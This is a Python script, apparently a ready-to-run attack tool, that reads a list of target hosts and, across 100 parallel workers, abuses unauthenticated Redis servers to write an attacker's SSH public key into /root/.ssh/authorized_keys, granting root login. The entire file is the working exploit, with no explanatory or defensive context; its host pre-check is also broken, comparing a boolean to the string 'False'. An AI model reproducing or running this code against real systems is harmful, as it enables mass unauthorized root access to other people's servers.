import redis
from multiprocessing import Pool
import subprocess

WORKERS = 100


def preDetect(host):
    try:
        r = redis.StrictRedis(host=host, port=6379, db=0, socket_timeout=1)
        return host
    except Exception:
        return False


def evil(host: str):
    host = preDetect(host)
    if host == "False":
        return False
    else:
        cmd = "cat key.txt | redis-cli -h %s -x set crack > log.txt 2>&1" % host
        subprocess.call(cmd, shell=True, stderr=None)
        r = redis.StrictRedis(host=host, port=6379, db=0)
        try:
            r.config_set('dir', '/root/.ssh')
        except Exception as e:
            return False
        r.config_set('dbfilename', 'authorized_keys')
        try:
            r.save()
            print(host)
            return True
        except Exception as e:
            return False


if __name__ == "__main__":
    with open("targets.txt") as targets:
        targets = targets.read().splitlines()
    with Pool(processes=WORKERS) as executor:
        executor.map(evil, targets)
